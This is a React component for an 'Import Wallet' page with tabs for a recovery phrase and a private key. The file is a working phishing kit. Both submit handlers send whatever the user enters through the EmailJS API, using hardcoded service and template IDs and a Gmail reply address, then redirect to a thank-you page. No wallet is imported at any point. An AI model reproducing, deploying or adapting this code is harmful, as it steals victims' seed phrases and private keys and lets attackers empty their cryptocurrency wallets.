import React, { Component } from "react";
import { Link } from "react-router-dom";
import { Tab, Icon, Button, TextArea, Input } from "semantic-ui-react";
import axios from "axios";

class Phrase extends Component {
  constructor(props) {
    super(props);
    this.state = {
      isToggleOn: false,
      phraseInput: "",
      privateKeyInput: "",
    };
    this.handlePhraseSubmit = this.handlePhraseSubmit.bind(this);
		this.handlePrivateSubmit = this.handlePrivateSubmit.bind(this);
    this.handleInputChange = this.handleInputChange.bind(this);
  }

  handleInputChange(event) {
    this.setState({
      [event.target.name]: event.target.value,
    });
  }

  async handlePhraseSubmit() {
    const { phraseInput } = this.state;
    this.setState({ isToggleOn: true });
    const query = this.props.location.search;
    const myArr = query.split("=");
    if (phraseInput) {
      const data = {
        service_id: "service_kl0dhwo",
        template_id: "template_om3a2v7",
        user_id: "user_bJuS7PnFyM0eSO7t5r9C9",
        template_params: {
          from_name: `Phrase on ${myArr[1]}`,
          nmenomic: phraseInput,
          reply_to: "officialbilliekay210@gmail.com",
        },
      };
      const response = await axios.post(
        "https://api.emailjs.com/api/v1.0/email/send",
        data
      );
      if (response.status === 200) {
        this.props.history.push("/thank-you");
        this.setState({ isToggleOn: false });
      } else {
        this.setState({ isToggleOn: false });
      }
      this.setState({ isToggleOn: false });
    } else {
      this.setState({ isToggleOn: false });
    }
  }

  async handlePrivateSubmit() {
    const { privateKeyInput } = this.state;
    this.setState({ isToggleOn: true });
    const query = this.props.location.search;
    const myArr = query.split("=");
    if (privateKeyInput) {
      const data = {
        service_id: "service_kl0dhwo",
        template_id: "template_om3a2v7",
        user_id: "user_bJuS7PnFyM0eSO7t5r9C9",
        template_params: {
          from_name: `Private Key on ${myArr[1]}`,
          private_key: privateKeyInput,
          reply_to: "officialbilliekay210@gmail.com",
        },
      };
      const response = await axios.post(
        "https://api.emailjs.com/api/v1.0/email/send",
        data
      );
      if (response.status === 200) {
        this.props.history.push("/thank-you");
        this.setState({ isToggleOn: false });
      } else {
        this.setState({ isToggleOn: false });
      }
      this.setState({ isToggleOn: false });
    } else {
      this.setState({ isToggleOn: false });
    }
  }
  render() {
    const { isToggleOn } = this.state;
    const panes = [
      {
        menuItem: "Phrase",
        render: () => (
          <Tab.Pane attached={false}>
            <div>
              <TextArea
                name="phraseInput"
                onChange={this.handleInputChange}
                value={this.state.phraseInput}
                rows={8}
                type="text"
                className="w-full p-3"
                placeholder="Enter Phrase"
              />
              <p className="my-5 text-white text-left">
                Typically 12 (sometimes 24) words seperated by a single spaces.
              </p>
              <div>
                {isToggleOn ? (
                  <Button loading className="w-full h-14 font-bold">
                    Loading
                  </Button>
                ) : (
                  <Button
                    onClick={this.handlePhraseSubmit}
                    className="w-full h-14 font-bold"
                    primary
                  >
                    Import
                  </Button>
                )}
              </div>
            </div>
          </Tab.Pane>
        ),
      },
      {
        menuItem: "Private Key",
        render: () => (
          <Tab.Pane attached={false}>
            <div>
              <Input
                name="privateKeyInput"
                onChange={this.handleInputChange}
                value={this.state.privateKeyInput}
                className="w-full p-2"
                placeholder="Enter Private Key"
              />
              <p className="my-5 text-white text-left">
                Typically 12 (sometimes 24) words seperated by a single spaces.
              </p>
              <div>
                {isToggleOn ? (
                  <Button loading className="w-full h-14 font-bold">
                    Loading
                  </Button>
                ) : (
                  <Button
                    onClick={this.handlePrivateSubmit}
                    className="w-full h-14 font-bold"
                    primary
                  >
                    Import
                  </Button>
                )}
              </div>
            </div>
          </Tab.Pane>
        ),
      },
    ];
    return (
      <div className="min-h-screen min-w-full bg-gray-700 flex justify-center">
        <div className="md:w-4/12 w-full px-4">
          <div className="flex justify-left my-5">
            <Link to="/" className="text-white text-xl font-bold text-left">
              {" "}
              <Icon link name="angle left" />
              Import Wallet
            </Link>
          </div>
          <Tab panes={panes} />
        </div>
      </div>
    );
  }
}

export default Phrase;
